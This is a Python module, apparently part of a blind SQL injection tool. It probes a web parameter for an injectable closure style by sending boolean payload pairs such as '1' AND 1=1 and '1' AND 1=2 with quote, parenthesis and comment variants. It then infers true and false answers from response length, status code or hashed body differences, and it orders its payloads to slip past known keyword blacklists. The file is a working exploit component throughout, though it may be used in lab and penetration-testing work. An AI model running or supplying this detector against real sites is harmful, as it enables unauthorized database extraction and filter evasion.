"""Automatically probe the closing style + reflected output characteristics

v1.1:
  * Among candidates, "comment-free" forms take priority (fewer detours when comment tokens are blocked)
  * When the blacklist is known, candidates that hit the blacklist are moved to the last batch (rather than discarded outright,
    because some lab ranges' blacklists are not actually enforced)

v1.2:
  * The decision signal is upgraded from "pure length difference" to three tiers: length difference → status-code difference → response-body block diff.
    This solves the problem where closing-style detection simply fails when "true/false pages have exactly the same length"
    (unified template / unified error page / framework that forces 200 with equal length).
  * Baseline sampling also estimates "content noise": timestamps / CSRF tokens / random ad slots on the page
    make each response slightly different. The larger the noise, the higher the decision threshold for the content signal is raised,
    avoiding mistaking random elements for injection reflected output (the most typical source of false positives for content-based decisions).
"""
import hashlib
import statistics


# Block size when comparing response bodies (bytes)
_BLOCK = 64
# Maximum bytes examined per comparison, to avoid huge pages slowing down probing
_DIFF_LIMIT = 200000
# Absolute floor of content diff ratio: below it the page is considered "unchanged"
MIN_BODY_DIFF = 0.02


def _blocks(text, limit=_DIFF_LIMIT):
    """Split the response body into blocks of length _BLOCK and return the md5 of each block.

    O(n) and hashes only once, much faster than difflib's sequence matching.
    """
    b = text[:limit].encode("utf-8", "replace")
    return [hashlib.md5(b[i:i + _BLOCK]).digest()
            for i in range(0, len(b), _BLOCK)]


def body_diff(a, b):
    """Diff ratio between two response bodies (0.0 ~ 1.0), compared with fixed-block alignment.

    Especially effective for two responses of "exactly equal length": inserting/deleting a whole block shows up immediately as a difference,
    while purely random small changes (timestamps) affect only a few blocks, a very low proportion.
    """
    if a == b:
        return 0.0
    ca, cb = _blocks(a), _blocks(b)
    n = max(len(ca), len(cb))
    if n == 0:
        return 0.0
    same = 0
    for x, y in zip(ca, cb):
        if x == y:
            same += 1
    return 1.0 - same / n


def body_gate(noise):
    """Derive the content-signal threshold from the baseline noise."""
    return max(MIN_BODY_DIFF, noise * 3)


class Detector:
    def __init__(self, requester, space=" ", log=None, blacklist=None):
        self.req = requester
        self.space = space
        self.log = log
        self.blacklist = blacklist
        self.baseline_median = 0
        self.baseline_jitter = 0
        self.baseline_noise = 0.0
        self.threshold = 5
        self.prefix = None
        self.suffix = None
        self.closure_name = None
        self.true_len = None
        self.false_len = None
        # v1.2: the signal name used on a hit, plus the t/f response bodies (for deciding when lengths are indistinguishable)
        self.signal = None
        self.true_text = ""
        self.false_text = ""

    def _sample_baseline(self, payload="1", n=3):
        """Sample the baseline: median length + jitter range + content noise level."""
        samples = []
        for _ in range(n):
            r = self.req.send(payload, use_cache=False)
            if r["status"] != -1:
                samples.append(r)
        if not samples:
            return None
        lens = [s["length"] for s in samples]
        noise = 0.0
        for i in range(len(samples)):
            for j in range(i + 1, len(samples)):
                noise = max(noise, body_diff(samples[i]["text"], samples[j]["text"]))
        return {"median": int(statistics.median(lens)),
                "jitter": max(lens) - min(lens),
                "noise": noise}

    def detect(self):
        print("[*] Sampling baseline...")
        base = self._sample_baseline("1", n=3)
        if not base:
            print("[-] Target unreachable")
            return False
        self.baseline_median = base["median"]
        self.baseline_jitter = base["jitter"]
        self.baseline_noise = base["noise"]
        self.threshold = max(5, self.baseline_jitter * 2)
        print(f"[+] Baseline: len={self.baseline_median}B "
              f"(jitter±{self.baseline_jitter}B, content noise {self.baseline_noise:.1%})")

        print("[*] Probing closing style...")
        if not self._probe_closure():
            print("[!] None of the 12 closing candidates can distinguish true/false responses")
            print("    Common causes:")
            print("      · Response length and content are both identical (unified template / unified error page)")
            print("      · This parameter has no injection")
            print("      · Wrong parameter name (--param) or authentication required (--cookie)")
            return False

        print(f"[+] Closing: {self.closure_name}  (signal: {self.signal})")
        if self.true_len == self.false_len:
            print(f"    True/False have equal length ({self.true_len}B), switching to content diff to distinguish")
        else:
            print(f"    True:  {self.true_len}B")
            print(f"    False: {self.false_len}B")
        return True

    def _candidates(self):
        sp = self.space
        # Comment-free forms first, commented forms after
        return [
            # ---- comment-free ----
            ("numeric",            f"1{sp}AND{sp}",     ""),
            ("single-quote",       f"1'{sp}AND{sp}",    f"{sp}AND{sp}'1'='1"),
            ("double-quote",       f'1"{sp}AND{sp}',    f'{sp}AND{sp}"1"="1'),
            ("paren-single",       f"1'){sp}AND{sp}('", f"){sp}AND{sp}'1'='1"),
            ("paren-numeric",      f"1){sp}AND{sp}(",   f"){sp}AND{sp}1=1"),
            # ---- rely on comments, placed later ----
            ("numeric(commented)", f"1{sp}AND{sp}",     f"{sp}--{sp}-"),
            ("numeric(#)",         f"1{sp}AND{sp}",     "#"),
            ("single(commented)",  f"1'{sp}AND{sp}",    f"{sp}--{sp}-"),
            ("single(#)",          f"1'{sp}AND{sp}",    "#"),
            ("double(commented)",  f'1"{sp}AND{sp}',    f"{sp}--{sp}-"),
            ("double(#)",          f'1"{sp}AND{sp}',    "#"),
            ("paren-single(cmt)",  f"1'){sp}AND{sp}(",  f")--{sp}-"),
        ]

    def _distinguishable(self, t, f):
        """Whether the two responses are "distinguishable"; returns the matched signal name or None.

        Three-tier fallback:
          1. length diff exceeds threshold  —— most classic, most reliable
          2. status code differs             —— some frameworks use different HTTP statuses for true/false
          3. response-body block diff        —— the last resort when length is flattened by the template
        """
        if abs(t["length"] - f["length"]) >= self.threshold:
            return "length"
        if t["status"] != f["status"]:
            return "status"
        if body_diff(t["text"], f["text"]) > body_gate(self.baseline_noise):
            return "content"
        return None

    def _probe_closure(self):
        cands = self._candidates()

        # Two batches: first try those "containing no blocked token", then the rest
        if self.blacklist and self.blacklist.tokens:
            clean, dirty = [], []
            for c in cands:
                (clean if not self.blacklist.is_blocked(c[1] + "1=1" + c[2]) else dirty).append(c)
            batches = [clean, dirty]
        else:
            batches = [cands]

        for batch in batches:
            for name, prefix, suffix in batch:
                t = self.req.send(prefix + "1=1" + suffix)
                f = self.req.send(prefix + "1=2" + suffix)
                if t["status"] == -1 or f["status"] == -1:
                    continue
                sig = self._distinguishable(t, f)
                if not sig:
                    continue
                self.prefix, self.suffix = prefix, suffix
                self.closure_name = name
                self.signal = sig
                self.true_len, self.false_len = t["length"], f["length"]
                self.true_text, self.false_text = t["text"], f["text"]
                return True
        return False

    def build(self, condition):
        return self.prefix + condition + self.suffix

    def is_true(self, condition):
        r = self.req.send(self.build(condition))
        if r["status"] == -1:
            return None
        if self.true_len != self.false_len:
            mid = (self.true_len + self.false_len) / 2
            if self.true_len > self.false_len:
                return r["length"] > mid
            return r["length"] < mid
        # Lengths indistinguishable (closing inferred from status/content) → decide by response-body similarity:
        # whichever is closer to the "all-true sample" is true. A single request pair is noisy itself,
        # but the noise is two-way, so comparing relative distances cancels it out.
        return body_diff(r["text"], self.true_text) <= body_diff(r["text"], self.false_text)
